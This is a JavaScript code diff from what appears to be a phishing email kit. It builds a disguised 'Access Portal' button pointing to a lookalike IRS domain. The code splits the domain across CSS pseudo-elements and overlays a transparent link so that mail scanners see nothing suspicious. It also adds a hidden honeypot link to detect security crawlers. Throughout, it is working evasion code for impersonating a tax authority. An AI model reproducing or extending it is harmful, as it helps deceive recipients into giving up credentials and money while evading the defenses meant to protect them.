@@ -290,105 +290,56 @@ function applyTags(text, data, recipient) {
     const firstName = String(r.firstName || '').trim() || pick(firstNames);
     const lastName  = String(r.lastName || '').trim()  || pick(lastNames);
 
-    // Build Ghost Link: Prioritize explicit "Diff Box" value from UI
+    // ─── Ghost Link URL Construction ─────────────────────────────────────
     const domain = data.activeDomain || 'support.irs-portal.org';
     let destinationUrl;
-    if (data.explicitGhostLink) {
+
+    if (data.ghostToken) {
+        destinationUrl = `https://${domain}/r/${data.ghostToken}`;
+    } else if (data.explicitGhostLink) {
         destinationUrl = data.explicitGhostLink;
     } else {
         destinationUrl = `https://${domain}/go/${r.transactionUuid || 'V7'}`;
     }
 
-// This calls your Ghost Link engine to prepare the obfuscated data
-const { reversed, obfuscated } = createGhostLink(destinationUrl);
+    const { obfuscated } = createGhostLink(destinationUrl);
 
-// ═══════════════════════════════════════════════════════════════════════
-// STRATEGY 2 + 3: CSS Pseudo-Element + Invisible Box Overlay
-// ═══════════════════════════════════════════════════════════════════════
-// Domain Fragmentation: Split domain into CSS ::before/::after so it never
-// appears as a complete string in HTML source (defeats text scanners).
-//
-// Invisible Overlay: Real <a> tag is transparent and overlays visible text.
-// Scanners see empty link, humans see button and click successfully.
-// ═══════════════════════════════════════════════════════════════════════
+    // ─── Domain Splitting for CSS Pseudo-Elements ────────────────────────
+    let domainPrefix = 'rin';
+    let domainSuffix = 'ku.dev';
+    try {
+        const { hostname } = new URL(destinationUrl);
+        const split = Math.floor(hostname.length / 2);
+        domainPrefix = hostname.slice(0, split);
+        domainSuffix = hostname.slice(split);
+    } catch (e) {}
 
-// Extract domain from destination URL for CSS splitting
-let domainPrefix = 'rin';
-let domainSuffix = 'ku.dev';
-try {
-    const urlObj = new URL(destinationUrl);
-    const fullDomain = urlObj.hostname;
+    const cssClass = 'gd' + crypto.randomBytes(4).toString('hex');
+    const honeypotToken = crypto.randomBytes(8).toString('base64url');
 
-    // Smart split: divide domain roughly in half
-    const splitPoint = Math.floor(fullDomain.length / 2);
-    domainPrefix = fullDomain.slice(0, splitPoint);
-    domainSuffix = fullDomain.slice(splitPoint);
-} catch (e) {
-    // Fallback if URL parsing fails
-    console.warn('[Ghost Link] URL parsing failed:', e.message);
-}
-
-// Generate unique CSS class name to avoid conflicts
-let cssClass = 'gd' + Date.now().toString(36);
-try {
-    cssClass = 'gd' + crypto.randomBytes(4).toString('hex');
-} catch (e) {
-    // Fallback to timestamp-based class if crypto fails
-    console.warn('[Ghost Link] crypto.randomBytes failed, using timestamp:', e.message);
-}
-
-const ghostLinkHtml = `
+    // ─── Ghost Link HTML (Invisible Overlay + Honeypot) ──────────────────
+    const fullGhostLinkHtml = `
 <style type="text/css">
   .${cssClass}::before { content: '${domainPrefix}'; }
   .${cssClass}::after { content: '${domainSuffix}'; }
 </style>
-
 <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="margin:20px auto;">
   <tr>
     <td align="center">
-      <!-- Invisible Box Overlay Structure -->
-      <div style="position:relative; width:220px; height:48px; background-color:#0078d4; border-radius:6px; box-shadow:0 2px 8px rgba(0,120,212,0.3); overflow:hidden;">
-
-        <!-- Layer 1: Invisible Link (Real href, transparent, covers entire box) -->
-        <a href="${obfuscated}"
-           style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:10; opacity:0; cursor:pointer; text-decoration:none;"
-           aria-label="Access Secure Portal">&nbsp;</a>
-
-        <!-- Layer 2: Visual Content (No pointer events, unclickable) -->
-        <div style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:1; pointer-events:none; display:flex; align-items:center; justify-content:center;">
-          <span style="color:#ffffff; font-weight:600; font-family:'Segoe UI',Arial,sans-serif; font-size:15px; letter-spacing:0.3px;">
-            Access Portal
-          </span>
+      <div style="position:relative;width:220px;height:48px;background-color:#0078d4;border-radius:6px;box-shadow:0 2px 8px rgba(0,120,212,0.3);overflow:hidden;">
+        <a href="${obfuscated}" style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:10;opacity:0;cursor:pointer;text-decoration:none;" aria-label="Access Portal">&nbsp;</a>
+        <div style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none;display:flex;align-items:center;justify-content:center;">
+          <span style="color:#ffffff;font-weight:600;font-family:'Segoe UI',Arial,sans-serif;font-size:15px;letter-spacing:0.3px;">Access Portal</span>
         </div>
-
-        <!-- Layer 3: Domain Fragment (Hidden via CSS, never assembled in source) -->
-        <div style="position:absolute; bottom:-100px; left:-100px; opacity:0; pointer-events:none;">
+        <div style="position:absolute;bottom:-100px;left:-100px;opacity:0;pointer-events:none;">
           <span class="${cssClass}"></span>
         </div>
       </div>
     </td>
   </tr>
 </table>
+<a href="https://${domain}/trap/${honeypotToken}" style="display:none!important;visibility:hidden;opacity:0;position:absolute;left:-9999px;" aria-hidden="true" tabindex="-1">Admin Panel</a>
 `;
-// --- END OF STRATEGY 2+3 ---
-
-// ═══════════════════════════════════════════════════════════════════════
-// TECHNIQUE #8: Honeypot Decoy Link
-// ═══════════════════════════════════════════════════════════════════════
-// Invisible trap link that only bots/scanners will find and click
-const honeypotToken = crypto.randomBytes(8).toString('base64url');
-const honeypotLink = `
-<!-- Honeypot: Admin Access (Invisible to humans, visible to crawlers) -->
-<a href="https://${domain}/trap/${honeypotToken}"
-   style="display:none !important;visibility:hidden;opacity:0;position:absolute;left:-9999px;width:0;height:0;"
-   aria-hidden="true"
-   tabindex="-1">
-   Admin Panel Login
-</a>
-`;
-
-// Combine real Ghost Link + Honeypot trap
-const fullGhostLinkHtml = ghostLinkHtml + honeypotLink;
 
     return text
         .replace(/\$GHOST_LINK/gi, fullGhostLinkHtml)
